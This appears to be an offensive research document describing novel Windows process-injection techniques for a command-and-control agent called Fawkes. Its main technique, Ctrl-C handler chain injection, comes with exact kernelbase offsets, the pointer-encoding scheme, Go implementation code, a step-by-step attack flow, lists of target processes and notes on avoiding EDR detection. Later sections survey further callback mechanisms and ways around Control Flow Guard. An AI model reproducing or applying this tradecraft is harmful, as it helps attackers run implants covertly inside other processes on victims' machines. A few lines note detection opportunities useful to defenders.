# Opus Injection Research

Novel process injection techniques developed for the Fawkes agent, focusing on unexplored callback mechanisms in Windows.

## Overview

The "Opus Injection" family of techniques explores Windows callback mechanisms that haven't been weaponized in common tooling. The goal is to find function pointer structures in target processes that can be manipulated to achieve code execution through legitimate Windows API triggers.

**Key Advantage:** These techniques avoid commonly monitored APIs like `CreateRemoteThread`, `QueueUserAPC`, and thread pool manipulation, presenting a different detection surface.

---

## Variant 1: Ctrl-C Handler Chain Injection

### Executive Summary

This technique hijacks the Windows console control handler mechanism to achieve code execution. By injecting a fake handler into the target process's handler array and triggering a console control event, Windows itself executes our shellcode as part of its normal handler dispatch routine.

**Status:** ✅ Implemented and tested
**Target:** Console processes only
**Shellcode:** Position-independent code (C-based agents, msfvenom, Cobalt Strike)

### Background: How Console Control Handlers Work

When a Windows console application calls `SetConsoleCtrlHandler()`, it registers a callback function that gets invoked when console events occur (Ctrl+C, Ctrl+Break, console close, logoff, shutdown). The handler signature is:

```c
typedef BOOL (WINAPI *PHANDLER_ROUTINE)(DWORD dwCtrlType);
```

Where `dwCtrlType` is one of:
- `CTRL_C_EVENT` (0) - Ctrl+C pressed
- `CTRL_BREAK_EVENT` (1) - Ctrl+Break pressed
- `CTRL_CLOSE_EVENT` (2) - Console window closing
- `CTRL_LOGOFF_EVENT` (5) - User logging off
- `CTRL_SHUTDOWN_EVENT` (6) - System shutting down

When an event occurs, Windows walks the handler list and calls each registered handler until one returns `TRUE` (handled) or the list is exhausted.

### Internal Structure Discovery

Through reverse engineering with WinDbg, we discovered that the handler list is **not** a linked list as one might assume, but rather a **heap-allocated array of encoded function pointers**.

#### Key Global Variables in kernelbase.dll

```
kernelbase!HandlerList              @ RVA 0x399490  - Pointer to heap-allocated array
kernelbase!HandlerListLength        @ RVA 0x39CBB0  - Current number of handlers (DWORD)
kernelbase!AllocatedHandlerListLength @ RVA 0x39CBB4  - Array capacity (DWORD)
kernelbase!SingleHandler            @ RVA 0x39CBA8  - Optimization for single handler
kernelbase!ConsoleStateLock         @ RVA 0x39CC00  - Critical section (we bypass this)
```

**Note:** These RVA offsets were determined on Windows 11 23H2/24H2. They may differ on other Windows versions.

#### Memory Layout

```
kernelbase.dll + 0x399490:  [Pointer to Handler Array] ──────┐
                                                              │
                                                              ▼
Heap Memory:                ┌─────────────────────────────────────────┐
                            │ EncodedHandler[0]  (8 bytes, encoded)   │
                            │ EncodedHandler[1]  (8 bytes, encoded)   │
                            │ EncodedHandler[2]  (8 bytes, encoded)   │
                            │ ...                                     │
                            │ EncodedHandler[n]  (8 bytes, encoded)   │
                            │ [unused capacity]                       │
                            └─────────────────────────────────────────┘

kernelbase.dll + 0x39CBB0:  [HandlerListLength = n+1]  (DWORD)
kernelbase.dll + 0x39CBB4:  [AllocatedLength = capacity]  (DWORD)
```

### Critical Detail: Pointer Encoding

**This is the most important implementation detail.** Handler pointers are NOT stored as raw addresses. They are encoded using `RtlEncodePointer` to prevent simple pointer overwrites.

#### RtlEncodePointer Algorithm

```c
// Encoding: (pointer XOR cookie) ROR (cookie & 0x3F)
PVOID RtlEncodePointer(PVOID Pointer) {
    ULONG Cookie = GetProcessCookie();  // 32-bit value
    ULONG_PTR Result = (ULONG_PTR)Pointer ^ Cookie;
    ULONG RotateAmount = Cookie & 0x3F;  // 0-63 bits
    Result = RotateRight(Result, RotateAmount);
    return (PVOID)Result;
}

// Decoding: ROL (encoded, cookie & 0x3F) XOR cookie
PVOID RtlDecodePointer(PVOID Encoded) {
    ULONG Cookie = GetProcessCookie();
    ULONG_PTR Result = (ULONG_PTR)Encoded;
    ULONG RotateAmount = Cookie & 0x3F;
    Result = RotateLeft(Result, RotateAmount);
    Result ^= Cookie;
    return (PVOID)Result;
}
```

#### Retrieving the Process Cookie

The process cookie is a per-process random value generated at process creation. It can be retrieved via:

```c
// NtQueryInformationProcess with ProcessCookie (info class 36)
ULONG Cookie;
ULONG ReturnLength;
NtQueryInformationProcess(
    hProcess,
    ProcessCookie,  // 36
    &Cookie,
    sizeof(Cookie),
    &ReturnLength
);
```

**Important:** The cookie is a 32-bit DWORD value, even on 64-bit systems. Do NOT confuse this with the value at PEB+0x78, which is the TlsBitmap pointer.

### Attack Flow

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        OPUS INJECTION VARIANT 1                         │
│                    Ctrl-C Handler Chain Injection                       │
└─────────────────────────────────────────────────────────────────────────┘

Step 1: Open Target Process
    ├── OpenProcess() with VM_READ | VM_WRITE | VM_OPERATION | QUERY_INFORMATION
    └── Target must be a console process

Step 2: Locate kernelbase.dll
    ├── EnumProcessModulesEx() to enumerate loaded modules
    └── Find kernelbase.dll base address in target

Step 3: Calculate Structure Addresses
    ├── HandlerList pointer    = kernelbase + 0x399490
    ├── HandlerListLength      = kernelbase + 0x39CBB0
    └── AllocatedHandlerLength = kernelbase + 0x39CBB4

Step 4: Read Current State
    ├── Read HandlerList pointer → get heap array address
    ├── Read HandlerListLength   → current handler count
    ├── Read AllocatedLength     → array capacity
    └── Verify: count < capacity (room for new handler)

Step 5: Get Process Cookie
    ├── NtQueryInformationProcess(ProcessCookie)
    └── Returns 32-bit cookie value

Step 6: Allocate Shellcode Memory
    ├── VirtualAllocEx() with PAGE_EXECUTE_READWRITE
    └── Get shellcode address in target process

Step 7: Write Shellcode
    └── WriteProcessMemory() shellcode to allocated region

Step 8: Encode Shellcode Address
    ├── encoded = shellcode_addr XOR cookie
    └── encoded = RotateRight(encoded, cookie & 0x3F)

Step 9: Install Handler
    ├── Calculate target slot: HandlerArray + (HandlerListLength * 8)
    └── WriteProcessMemory() encoded pointer to slot

Step 10: Update Handler Count
    └── WriteProcessMemory() increment HandlerListLength

Step 11: Trigger Execution
    ├── FreeConsole()           → Detach from our console
    ├── AttachConsole(pid)      → Attach to target's console
    ├── GenerateConsoleCtrlEvent(CTRL_C_EVENT, 0)  → Trigger handlers
    ├── FreeConsole()           → Detach from target
    └── AllocConsole()          → Restore our console

Step 12: Execution
    └── Windows decodes our pointer and calls shellcode as a handler!
```

### Implementation Details

#### Finding kernelbase.dll in Remote Process

```go
func findModuleInProcess(hProcess windows.Handle, moduleName string) (uintptr, error) {
    var modules [1024]windows.Handle
    var needed uint32

    err := windows.EnumProcessModulesEx(
        hProcess,
        &modules[0],
        uint32(len(modules)*8),
        &needed,
        windows.LIST_MODULES_ALL,
    )
    if err != nil {
        return 0, err
    }

    numModules := needed / 8
    for i := uint32(0); i < numModules; i++ {
        var modName [260]uint16
        windows.GetModuleBaseName(hProcess, modules[i], &modName[0], 260)
        name := windows.UTF16ToString(modName[:])
        if strings.EqualFold(name, moduleName) {
            return uintptr(modules[i]), nil
        }
    }
    return 0, fmt.Errorf("module not found")
}
```

#### Pointer Encoding Implementation

```go
func encodePointer(ptr uintptr, cookie uint32) uintptr {
    // XOR with cookie (zero-extended to 64-bit on x64)
    result := ptr ^ uintptr(cookie)

    // Rotate right by (cookie & 0x3F) bits
    rotateAmount := cookie & 0x3F
    if rotateAmount > 0 {
        result = (result >> rotateAmount) | (result << (64 - rotateAmount))
    }

    return result
}
```

#### Triggering the Handler

The key insight for automatic triggering:

```go
// After AttachConsole(pid), we're attached to the TARGET's console
// Process group 0 means "all processes on current console"
// So this sends Ctrl+C to the target, not to us!
procFreeConsole.Call()                           // Detach from our console
procAttachConsole.Call(uintptr(pid))             // Attach to target's console
procGenerateConsoleCtrlEvent.Call(CTRL_C_EVENT, 0)  // Trigger on current console
procFreeConsole.Call()                           // Detach from target
procAllocConsole.Call()                          // Restore our console
```

### Viable Targets

Any process with an attached console is a potential target. A process has a console if it has `conhost.exe` as a child/related process or was created with `ALLOC_CONSOLE`/`ATTACH_PARENT_CONSOLE`.

| Category | Processes | Notes |
|----------|-----------|-------|
| **Shells** | `cmd.exe`, `powershell.exe`, `pwsh.exe` | Almost always present on workstations |
| **Terminal Apps** | `WindowsTerminal.exe`, `ConEmu.exe`, `cmder.exe` | Developer machines |
| **Scripting Runtimes** | `python.exe`, `python3.exe`, `node.exe`, `ruby.exe`, `perl.exe` | Dev environments, some servers |
| **Java** | `java.exe`, `javaw.exe` (if console) | Enterprise environments |
| **Package Managers** | `npm.exe`, `pip.exe`, `choco.exe`, `winget.exe` | While running |
| **Build Tools** | `msbuild.exe`, `devenv.exe` (CLI mode), `gradle.exe` | CI/CD, dev machines |
| **Database CLIs** | `sqlcmd.exe`, `mysql.exe`, `psql.exe`, `mongo.exe` | Database servers |
| **Git** | `git.exe`, `git-bash.exe` | Very common on dev machines |
| **SSH/Remote** | `ssh.exe`, `putty.exe` (CLI), `openssh-server` | IT admin machines |
| **Sysadmin Tools** | `wmic.exe`, `netsh.exe` (if interactive) | While running |
| **Servers** | `nginx.exe`, `httpd.exe`, `redis-server.exe` | If started from console |
| **Monitoring/Agents** | Various backup agents, monitoring tools | Check target environment |

**Best Persistent Targets:**
- Long-running scripts (Python/Node services, scheduled tasks)
- Interactive shells (admin left PowerShell window open)
- Development servers (`npm start`, `python manage.py runserver`)
- Database connections (`sqlcmd` sessions, `mysql` clients)

### Shellcode Compatibility

| Shellcode Type | Compatible | Tested | Notes |
|----------------|------------|--------|-------|
| calc.bin (simple PIC) | ✅ Yes | ✅ Confirmed | Works reliably |
| msfvenom payloads | ✅ Yes | Expected | Standard PIC shellcode |
| Cobalt Strike | ✅ Yes | Expected | C-based, standard PIC |
| Xenon (C-based agent) | ✅ Yes | ✅ Confirmed | C-based Mythic agent works |
| Havoc | ✅ Yes | Expected | C-based |
| Brute Ratel | ✅ Yes | Expected | C-based |
| Go-based (Fawkes, Merlin, Sliver) | ❌ No | ✅ Confirmed fails | Go runtime needs TLS, stack setup |
| .NET/C# (Apollo) | ❌ No | ✅ Confirmed fails | CLR needs managed environment |

#### Why Runtime-Dependent Shellcode Fails

The Ctrl+C handler callback executes in a constrained context. Windows expects a simple function that:
1. Receives a single DWORD parameter (control type)
2. Returns a BOOL (TRUE if handled, FALSE to continue chain)
3. Executes quickly and returns

Complex runtimes like Go and .NET require:
- Thread Local Storage (TLS) properly initialized
- Stack cookies/canaries
- Exception handling chains (SEH/VEH)
- Runtime/GC initialization
- Managed execution environment

The callback context provides none of this infrastructure, causing runtime-dependent shellcode to crash or fail initialization.

### Limitations

- **Console processes only** - GUI applications without consoles are not viable targets
- **Target must have active console** - Detached or no-console processes won't work
- **Windows version dependent** - RVA offsets may differ across Windows versions
- **Runtime-dependent shellcode incompatible** - Go, .NET, and similar runtimes fail

### Console Restoration

After injection, the attacking process loses its original console due to `FreeConsole()`/`AttachConsole()` operations. The implementation calls `AllocConsole()` afterward to restore console functionality, though this creates a new console rather than re-attaching to the original.

### Detection Surface

| Action | API | Detection Likelihood |
|--------|-----|---------------------|
| Open target process | `OpenProcess` | Standard - commonly monitored |
| Enumerate modules | `EnumProcessModulesEx` | Low - legitimate usage common |
| Query process info | `NtQueryInformationProcess` | Low - legitimate usage common |
| Allocate remote memory | `VirtualAllocEx` | **High** - commonly monitored |
| Write remote memory | `WriteProcessMemory` | **High** - commonly monitored |
| Attach to console | `AttachConsole` | **Low** - rarely monitored |
| Generate console event | `GenerateConsoleCtrlEvent` | **Low** - rarely monitored |

**Advantages over traditional injection:**
- No `CreateRemoteThread` - avoids heavily monitored API
- No `QueueUserAPC` - avoids APC-based detection
- No thread pool manipulation - avoids PoolParty-style detection
- No DLL injection - no `LoadLibrary` calls
- No thread context manipulation - no `SetThreadContext`/`GetThreadContext`

**Potential detection opportunities:**
- Cross-process `WriteProcessMemory` to kernelbase.dll data sections
- `AttachConsole` followed immediately by `GenerateConsoleCtrlEvent`
- Process with no visible console window calling console APIs
- Modification of handler count without corresponding `SetConsoleCtrlHandler` call

### Reversing Notes

#### WinDbg Commands Used

```
# Find HandlerList symbol
x kernelbase!*handler*

# Examine SetConsoleCtrlHandler
uf kernelbase!SetConsoleCtrlHandler

# Check handler array
dq kernelbase!HandlerList L1
dq poi(kernelbase!HandlerList) L8

# Check handler count
dd kernelbase!HandlerListLength L1
dd kernelbase!AllocatedHandlerListLength L1

# Examine RtlEncodePointer
uf ntdll!RtlEncodePointer

# Get process cookie
!peb  # Look for cookie or use NtQueryInformationProcess
```

#### Key Findings from Reversing

1. Handler list is an array, not a linked list (simpler than expected)
2. Handlers are encoded with `RtlEncodePointer` (XOR + ROR)
3. Process cookie retrieved via `NtQueryInformationProcess(ProcessCookie)`, NOT from PEB
4. Cookie is 32-bit even on 64-bit systems
5. `ConsoleStateLock` critical section exists but can be bypassed for single writes
6. Array grows dynamically when capacity exceeded (we don't handle this case)

---

## Variant 2: WNF (Windows Notification Facility) Callback Injection

### Concept

WNF is an obscure publish/subscribe notification system in Windows used internally by OS components. Subscribers register callbacks that fire when state changes occur.

### Status: Research Complete - **CFG PROTECTED** (Implementation Blocked)

### Key Findings from Reversing

#### Global WNF Context Location

```
ntdll!LdrpThunkSignature+0x258:  [RtlRunOnce guard - one-time init]
ntdll!LdrpThunkSignature+0x260:  [WNF Context Pointer] → Heap structure
```

The WNF subscription root is stored at a fixed offset from `ntdll!LdrpThunkSignature+0x260`.

#### Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                     WNF SUBSCRIPTION ARCHITECTURE                        │
└─────────────────────────────────────────────────────────────────────────┘

ntdll!LdrpThunkSignature+0x260:  [WNF Context Pointer] ──────┐
                                                              │
                                                              ▼
                                    ┌─────────────────────────────────┐
                                    │       WNF Context Structure      │
                                    │  +0x10: List head pointer        │
                                    │  +0x18: First entry / encoded    │
                                    └─────────────────────────────────┘
                                                   │
                                                   ▼
                         ┌─────────────────────────────────────────────┐
                         │         WNF_NAME_SUBSCRIPTION               │
                         │  (Keyed by WNF_STATE_NAME - 64-bit ID)      │
                         │  Contains linked list of user subscriptions │
                         └─────────────────────────────────────────────┘
                                          │
                    ┌─────────────────────┼─────────────────────┐
                    ▼                     ▼                     ▼
        ┌───────────────────┐  ┌───────────────────┐  ┌───────────────────┐
        │ WNF_USER_SUB      │  │ WNF_USER_SUB      │  │ WNF_USER_SUB      │
        │ +0x18: Info ptr   │  │                   │  │                   │
        │ +0x20: RefCount   │  │                   │  │                   │
        │ +0x28: Callback   │  │                   │  │                   │
        │ +0x30: Context    │  │                   │  │                   │
        │ +0x38: SubProcTag │  │                   │  │                   │
        │ +0x50: SerialGrp  │  │                   │  │                   │
        └───────────────────┘  └───────────────────┘  └───────────────────┘
```

#### Key Functions

| Function | Purpose |
|----------|---------|
| `RtlSubscribeWnfStateChangeNotification` | Main subscription API |
| `RtlpSubscribeWnfStateChangeNotificationInternal` | Internal implementation |
| `RtlpCreateWnfUserSubscription` | Creates user subscription entry |
| `RtlpCreateWnfNameSubscription` | Creates name subscription |
| `RtlpAddWnfUserSubToNameSub` | Links user sub to name sub |
| `RtlpWnfWalkUserSubscriptionList` | **Callback dispatcher** - walks and invokes |
| `RtlpGetFirstWnfNameSubscription` | Iterator for name subscriptions |
| `NtUpdateWnfStateData` | **Trigger** - publishing data invokes callbacks |

#### Critical Blocker: CFG Protection

From `RtlpWnfWalkUserSubscriptionList`:
```asm
mov rax, rsi                                    ; rsi = callback pointer
call ntdll!guard_dispatch_icall$thunk$...       ; CFG-protected indirect call
```

**All WNF callbacks are protected by Control Flow Guard (CFG).** Overwriting a callback pointer with shellcode will fail CFG validation and crash the process.

#### Potential CFG Workaround

`SetProcessValidCallTargets` can add addresses to the CFG bitmap:
```c
// kernelbase!SetProcessValidCallTargets calls:
NtSetInformationVirtualMemory(
    hProcess,
    VmCfgCallTargetInformation,  // Info class 2
    ...
);
```

This would require:
1. Opening target process with appropriate access
2. Calling SetProcessValidCallTargets to whitelist shellcode address
3. Then performing injection

**Downside:** Adds another uncommon API call to detection surface.

### WinDbg Commands Used

```
x ntdll!*Wnf*                                    # Find WNF symbols
uf ntdll!RtlSubscribeWnfStateChangeNotification  # Subscription flow
uf ntdll!RtlpWnfWalkUserSubscriptionList         # Callback dispatch
uf ntdll!RtlpGetFirstWnfNameSubscription         # Find global context
dq ntdll!LdrpThunkSignature+0x260 L1             # WNF context pointer
```

### Conclusion

WNF injection is **theoretically possible** but blocked by CFG. Would require SetProcessValidCallTargets workaround, adding complexity and detection surface. **Not recommended** unless CFG workaround becomes necessary for other reasons.

---

## Variant 3: FLS (Fiber Local Storage) Callback Injection

### Concept

Fiber Local Storage allows associating data with fibers/threads, with optional cleanup callbacks when slots are freed or threads exit.

### Status: Research Complete - **CFG PROTECTED** (Implementation Blocked)

### Key Findings from Reversing

#### Global FLS Context Location

```
ntdll!RtlpFlsContext (00007ffd`f83ede30)  - Global FLS context
TEB+0x17c8: FlsData                       - Per-thread FLS data pointer
```

#### Key Functions

| Function | Purpose |
|----------|---------|
| `RtlFlsAlloc` / `RtlFlsAllocEx` | Allocate FLS slot with optional callback |
| `RtlFlsFree` | Free slot, triggers cleanup callbacks |
| `RtlpFlsFree` | Internal implementation |
| `RtlFlsSetValue` / `RtlFlsGetValue` | Set/get FLS values |
| `RtlpFlsDataCleanup` | Thread exit cleanup |
| `RtlProcessFlsData` | Process FLS data |

#### Data Structures

```
RTL_BINARY_ARRAY<RTLP_FLS_CALLBACK_ENTRY,8,4>  - Callback storage
RTL_BINARY_ARRAY<RTLP_FLS_SLOT,8,4>            - Slot storage
```

FLS uses a "binary array" structure (tree-like array) rather than simple linear array.

#### Critical Blocker: CFG Protection

From `RtlpFlsFree`:
```asm
ntdll!RtlpFlsFree+0x10a:
    mov     rcx, qword ptr [rsi+8]              ; Load callback pointer
    call    ntdll!guard_dispatch_icall$thunk$...  ; CFG-protected!

ntdll!RtlpFlsFree+0x1d0:
    call    ntdll!guard_dispatch_icall$thunk$...  ; CFG-protected!
```

**All FLS callbacks are also protected by Control Flow Guard (CFG).** Same blocker as WNF.

### WinDbg Commands Used

```
x ntdll!*Fls*                    # Find FLS symbols
x ntdll!*fls*                    # Case variations
uf ntdll!RtlFlsFree              # Main free function
uf ntdll!RtlpFlsFree             # Internal implementation
dt ntdll!_TEB FlsData            # TEB offset for FLS data
```

### Conclusion

FLS injection is **theoretically possible** but blocked by CFG, same as WNF. No advantage over WNF for injection purposes.

---

## Variant 2 & 3 Summary: CFG Blocking Both

Both WNF and FLS callback mechanisms are protected by Control Flow Guard (CFG) on modern Windows. This means:

1. **Cannot simply overwrite callback pointers** - CFG will validate and crash
2. **Workaround exists** - SetProcessValidCallTargets can whitelist addresses
3. **Adds detection surface** - Additional unusual API call
4. **Complexity increase** - More code, more failure points

### Comparison Table

| Factor | Variant 1 (Ctrl-C) | Variant 2 (WNF) | Variant 3 (FLS) | Candidate C (ExFilter) | Candidate G (ETW) | Candidate A (TxnScope) |
|--------|-------------------|-----------------|-----------------|------------------------|-------------------|------------------------|
| **CFG Protected** | ❌ No | ✅ Yes | ✅ Yes | ✅ Yes | ✅ Yes | N/A |
| **Structure Complexity** | Low (array) | High (nested) | Medium (binary array) | Low (single pointer) | Medium (consumer sessions) | N/A |
| **Global Context** | kernelbase.dll | ntdll.dll | ntdll.dll | kernelbase.dll | sechost.dll | TEB (per-thread) |
| **Target Scope** | Console only | All processes | All processes | All processes | ETW consumers | N/A |
| **Trigger** | Ctrl+C event | NtUpdateWnfStateData | FlsFree / thread exit | Unhandled exception | ETW events | N/A |
| **Implementation** | ✅ Complete | ❌ Blocked by CFG | ❌ Blocked by CFG | ❌ Blocked by CFG | ❌ Blocked by CFG | ❌ Vestigial (unused) |
| **Failure Reason** | - | CFG validation | CFG validation | CFG validation | CFG validation | Callbacks never invoked |

### Recommendation

**Variant 1 (Ctrl-C Handler) remains the only viable callback injection without CFG bypass.**

For future work, if CFG bypass becomes available or acceptable:
- WNF would target more processes but has complex structures
- FLS would be simpler but still requires CFG workaround
- Exception Filter would be simplest (single pointer) but same CFG blocker

**Candidate A (TxnScope) is NOT a CFG issue** - the callbacks simply don't exist as functional mechanisms. They appear to be reserved/vestigial TEB fields that Windows never implemented.

---

## CFG Protection Pattern Analysis

### Emerging Pattern: Systematic CFG Retrofitting Complete

After investigating 6 callback-based mechanisms, a definitive pattern has emerged:

**CFG Protection Status:**
- ✅ WNF Callbacks (Variant 2) - `ntdll!RtlpWnfWalkUserSubscriptionList` uses `guard_dispatch_icall`
- ✅ FLS Callbacks (Variant 3) - `ntdll!RtlpFlsFree` uses `guard_dispatch_icall` (2 sites)
- ✅ Exception Filter (Candidate C) - `kernelbase!UnhandledExceptionFilter` uses `guard_dispatch_icall`
- ✅ ETW Consumer Callbacks (Candidate G) - `sechost!EtwpDoEventTraceCallbacks` uses `guard_dispatch_icall` (2 sites)
- ✅ DLL Notifications (Candidate D) - `ntdll!LdrpSendDllNotifications` uses `guard_dispatch_icall`
- ✅ RPC Dispatch Tables (Candidate H) - `rpcrt4!RpcInvokeCheckICall` uses `_guard_check_icall_fptr`
- ❌ Ctrl-C Handlers (Variant 1) - **NO CFG protection** ✅ WORKING

### Key Observations

1. **Microsoft has retrofitted CFG to older mechanisms**
   - ETW (Vista+), Exception Handling (ancient), FLS (XP+), WNF (Win8+)
   - Age of the mechanism does NOT correlate with CFG protection
   - Even mechanisms predating CFG by a decade now have protection

2. **Callback dispatch code is the protection point**
   - CFG is applied at the indirect call site in the dispatcher
   - Not at callback registration or storage
   - The `guard_dispatch_icall` thunk validates before transferring control

3. **CFG is applied systematically, not selectively**
   - **6 out of 7 investigated callback mechanisms** have CFG protection
   - 86% CFG application rate across diverse callback types
   - ALL modern callback mechanisms investigated are CFG protected
   - Security-focused, diagnostic, core OS, and RPC subsystems all protected
   - Pattern indicates complete/systematic CFG retrofitting effort by Microsoft
   - Only exception found: Console control handlers (legacy subsystem)

4. **Console Control Handlers remain unprotected**
   - Variant 1 works because `kernelbase!CtrlRoutine` does NOT use CFG
   - Possibly overlooked due to console subsystem being "legacy"
   - Or considered lower risk due to console-only scope

### Implications for Research

1. **Callback-based techniques face uphill battle**
   - Any newly discovered callback mechanism is likely CFG protected
   - Must assume CFG protection until proven otherwise
   - Testing each candidate before implementation is critical

2. **Need to shift focus**
   - Look for non-callback based techniques
   - Look for callback mechanisms in truly obscure/legacy subsystems
   - Consider CFG bypass techniques (`SetProcessValidCallTargets`)
   - Explore other injection paradigms beyond callback hijacking

3. **Variant 1's success is exceptional**
   - Console control handlers appear to be an outlier
   - Their lack of CFG protection is notable given widespread CFG application
   - Similar "forgotten" mechanisms may exist in other legacy subsystems

### Research Conclusion: Callback-Based Injection is Systematically Blocked

**ALL high-priority callback mechanisms investigated are CFG protected (6/6):**

With RPC dispatch tables confirmed as CFG protected, we've now verified that every major callback mechanism in Windows has been retrofitted with CFG validation. The 86% CFG protection rate (6 out of 7 mechanisms) represents a complete systematic hardening effort by Microsoft.

**Key Takeaway:** Console control handlers (Variant 1) appear to be an isolated exception in an otherwise comprehensively protected callback landscape. Finding additional unprotected callback mechanisms would require exploring extremely obscure or legacy subsystems that Microsoft may have overlooked.

### Recommended Research Pivot

Continuing callback-based research shows diminishing returns. Recommended next directions:

1. **Non-callback injection techniques** - Explore injection methods that don't rely on callback hijacking
   - Process/thread manipulation approaches
   - Code cave/inline hooking techniques
   - Memory-only execution methods
   - Return-oriented techniques

2. **CFG bypass implementation** - Implement `SetProcessValidCallTargets` to enable any callback technique
   - Adds detection surface but unlocks all blocked mechanisms
   - Could enable WNF, FLS, ETW, DLL notifications, or RPC injection

3. **Legacy/obscure subsystems** - Deep dive into forgotten Windows components
   - 16-bit compatibility layers
   - OS/2 subsystem remnants
   - POSIX subsystem
   - Other vestigial code paths

4. **Attack different stages** - Target other parts of the injection kill chain
   - Memory allocation primitives
   - Execution triggering mechanisms
   - Process creation/manipulation

---

## Variant 4: PEB KernelCallbackTable Injection

### Concept

The Kernel Callback Table is an array of function pointers stored in the Process Environment Block (PEB) at offset `+0x058`. This table is initialized when `user32.dll` loads into a GUI process and contains callbacks for handling window messages and interprocess communications via win32k.sys.

### Status: **PUBLICLY DOCUMENTED** (Implementation Pending)

**Note:** This technique is publicly documented and not novel (see [KernelCallbackTable-Injection-PoC](https://github.com/0xHossam/KernelCallbackTable-Injection-PoC)). However, it's worth implementing to test viability on Windows 11 25H2 and document our findings.

### Key Characteristics

- **Target:** GUI processes (requires `user32.dll`)
- **PEB Location:** `PEB+0x058` → KernelCallbackTable pointer
- **Target Callback:** `__fnCOPYDATA` (index 0, handles `WM_COPYDATA` messages)
- **Trigger:** Send `WM_COPYDATA` window message to target window
- **CFG Status:** Unknown on Windows 11 25H2 (PoC suggests it may work)

### Attack Flow

```
1. Enable SeDebugPrivilege
2. Create/identify target GUI process (e.g., notepad.exe)
3. Find target window handle and get PID
4. Open process handle (PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)
5. Query PEB address via NtQueryInformationProcess
6. Read KernelCallbackTable pointer from PEB+0x058
7. Allocate RWX memory in target for shellcode
8. Copy modified callback table to new memory:
   - Copy entire original table
   - Replace __fnCOPYDATA entry with shellcode address
9. Write modified table to target process
10. Update PEB+0x058 to point to modified table
11. Trigger via SendMessage(hWnd, WM_COPYDATA, ...)
12. Shellcode executes when WM_COPYDATA is processed
```

### Target Identification

KernelCallbackTable injection only works on GUI processes because:
- `user32.dll` must be loaded
- Process must have created windows
- KernelCallbackTable is initialized during user32.dll loading

Valid targets:
- `notepad.exe`
- `explorer.exe`
- Any GUI application with visible windows

### Trigger Mechanism

The `WM_COPYDATA` message provides cross-process data transfer:

```c
COPYDATASTRUCT cds = {0};
cds.dwData = 1;
cds.cbData = 4;
cds.lpData = "test";

SendMessage(hTargetWindow, WM_COPYDATA, (WPARAM)hWindow, (LPARAM)&cds);
```

When the target processes `WM_COPYDATA`, it dispatches to the callback table, invoking our shellcode.

### Why This Might Work (Despite Being Known)

1. **Older mechanism** - PEB callback table predates modern mitigations
2. **PoC exists** - Suggests it works on at least some Windows versions
3. **Different from callback registration** - Modifies PEB directly, not callback registration
4. **Win32k boundary** - Kernel→user callbacks may have different protection

### Implementation Complexity

- **Low-Medium** - PEB manipulation is straightforward
- **Simple trigger** - Single `SendMessage` call
- **GUI requirement** - Limits applicability to GUI processes only
- **Window enumeration** - Need to find target window handle

### Research Questions

- [ ] Does this work on Windows 11 25H2?
- [ ] Is callback dispatch CFG protected?
- [ ] Can we modify PEB+0x058 remotely?
- [ ] Which callback indices exist in the table?
- [ ] Are there better trigger messages than WM_COPYDATA?

### Advantages

- **Established PoC** - Implementation reference available
- **Simple trigger** - Easy to invoke via window messages
- **No callback registration** - Direct PEB manipulation
- **Legitimate mechanism** - WM_COPYDATA is normal IPC

### Limitations

- **GUI processes only** - Requires user32.dll and windows
- **Known technique** - Public PoCs exist (not novel)
- **PEB modification** - Suspicious cross-process PEB writes
- **Unknown CFG status** - May be protected on modern Windows

### Next Steps

1. Implement basic PoC based on GitHub reference
2. Test on Windows 11 25H2
3. Check for CFG protection
4. Document findings and compare to console control handler injection

---

## Future Variant Ideas (Previously Documented)

### Vectored Exception Handler Injection
- VEH list in ntdll (LdrpVectorHandlerList)
- Add entry, cause exception, handler fires
- Complex but powerful

### ALPC Callback Injection
- ALPC ports have completion callbacks
- Very complex, requires deep ALPC knowledge

---

## Novel Research Candidates (Unexplored)

The following techniques are based on analysis of Windows internals structures that appear to have function pointers or callback mechanisms that haven't been publicly weaponized. These are candidates for future research.

### Why These Might Work

Our research on Variants 1-3 revealed:
- **CFG is the main blocker** for callback-based injection on modern Windows
- **Older/obscure mechanisms may predate CFG** and not be protected
- **Per-thread structures (TEB)** are interesting because they're per-thread writable
- **Exception handling paths** often have different protection characteristics
- **Natural event triggers** provide automatic execution without manual triggering
- **Obscure diagnostic/management subsystems** are less likely to have been weaponized

### Research Methodology Update

After initial research phase, refocusing on:
- **Truly novel techniques** - avoiding known/documented methods
- **Natural triggers** - system events that occur automatically
- **Older subsystems** - more likely to lack CFG protection
- **Broad applicability** - techniques that work across many process types

---

## 🔬 PRIORITY CANDIDATES (Truly Novel Techniques)

### Candidate G: ETW (Event Tracing for Windows) Consumer Callbacks

#### Concept

ETW is Windows' event tracing infrastructure used for diagnostics and logging. Processes can register as ETW consumers with callback functions that fire when specific events occur. This mechanism appears **undocumented for injection purposes**.

#### Status: Research Complete - **CFG PROTECTED** (Implementation Blocked)

#### Key Findings from Reversing

##### Critical Blocker: CFG Protection

From `sechost!EtwpDoEventTraceCallbacks`, the function responsible for dispatching ETW consumer callbacks:

```asm
sechost!EtwpDoEventTraceCallbacks+0x13:
    call    sechost!guard_dispatch_icall$thunk$10345483385596137414  ; CFG PROTECTED!

sechost!EtwpDoEventTraceCallbacks+0x76:
    call    sechost!guard_dispatch_icall$thunk$10345483385596137414  ; CFG PROTECTED!
```

**Both ETW consumer callback invocation sites use `guard_dispatch_icall`**, which validates the callback target address against the CFG bitmap before allowing the call. This means:

- Overwriting callback pointers with shellcode addresses will fail CFG validation
- Process will crash or callback invocation will be blocked
- Same blocker as WNF, FLS, and Exception Filter mechanisms

##### WinDbg Commands Used

```
# Find ETW consumer functions
x sechost!*Trace*
x advapi32!*Trace*
x ntdll!*Etw*

# Check callback dispatch function
uf sechost!EtwpDoEventTraceCallbacks

# Confirmed: Two guard_dispatch_icall invocations at offsets +0x13 and +0x76
```

#### Why This Is Novel (But Still Blocked)

- ETW is primarily used for diagnostics/logging - not explored for injection
- Consumer-side callback manipulation appears completely undocumented
- Many processes consume ETW events (services, diagnostics tools, monitoring applications)
- Older mechanism (Vista+), possibly predates CFG protection
- Very obscure application of ETW

#### Background: How ETW Consumers Work

```c
// Processes register to consume ETW events:
EVENT_TRACE_LOGFILE TraceLogfile;
TraceLogfile.LogFileName = L"MyTrace.etl";  // or real-time: NULL
TraceLogfile.EventRecordCallback = MyCallbackFunction;  // ← Function pointer!
